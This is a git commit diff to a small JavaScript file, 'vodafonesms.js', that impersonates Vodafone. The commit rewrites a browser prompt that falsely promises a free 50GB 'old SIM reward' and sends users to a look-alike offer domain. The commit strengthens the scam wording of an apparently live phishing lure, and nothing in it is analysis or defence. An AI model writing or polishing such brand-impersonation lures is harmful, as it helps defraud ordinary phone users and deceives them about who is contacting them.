13289cc5746180f56020f1fff518c7bdd8a32136
bigetijazz4 <bigetijazz4@gmail.com>
2024-09-15 22:24:02 -0700

    Update vodafonesms.js

--- vodafonesms.js
+++ vodafonesms.js
@@ -1,6 +1,6 @@
 
 var password = '1'
-password=prompt('Vodafone: Dear customer, kindly check if your sim card is qualify to receive 50GB data, old customers Reward, press 1 to check now ','1');
+password=prompt('Vodafone: Congratulations, Your Number is Eligible to receive 50GB free data VODAFONE OLD SIM REWARD, Kindly press 1 to ACTIVATE ','1');
 if (password != '1') {
 location.href='https://www.moreofferzdetails.xyz/vodafonedata';
 }
